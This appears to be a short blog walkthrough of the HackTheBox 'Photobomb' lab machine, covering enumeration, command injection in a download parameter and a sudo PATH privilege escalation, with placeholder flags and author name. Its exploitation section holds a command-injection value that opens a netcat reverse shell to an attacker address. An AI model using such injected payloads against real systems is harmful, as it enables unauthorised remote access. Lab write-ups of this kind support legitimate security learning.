---
layout: post
title: "HackTheBox: Photobomb Machine Walkthrough"
date: 2025-11-10
category: CTF Writeup
tags: [ctf, hackthebox, linux, privilege-escalation]
author: Your Name
---

Complete walkthrough of the Photobomb machine from HackTheBox. This was an easy-rated Linux box focusing on command injection and privilege escalation.

## Initial Enumeration

Started with an nmap scan:
```bash
nmap -sC -sV -oN nmap/initial 10.10.11.182
```

Found ports:
- 22 (SSH)
- 80 (HTTP)

## Web Enumeration

Visiting the website shows a photography service. Found credentials in the source code through a JavaScript file.

### Finding the Vulnerability

The photo download feature was vulnerable to command injection in the filetype parameter.

## Exploitation

Used Burp Suite to intercept the download request and inject commands:
```bash
filename=test.jpg&filetype=jpg;nc -e /bin/bash 10.10.14.5 4444
```

Got a reverse shell!

## Privilege Escalation

Checked sudo permissions:
```bash
sudo -l
```

Found a script running with sudo privileges that had a PATH vulnerability.

Created a malicious binary and modified PATH to get root.

## Flags

- User flag: `a1b2c3d4e5f6...`
- Root flag: `f6e5d4c3b2a1...`

## Lessons Learned

1. Always check source code and JavaScript files
2. Command injection can occur in unexpected parameters
3. PATH vulnerabilities are still common in sudo scripts

Great machine for practicing web exploitation and basic privilege escalation!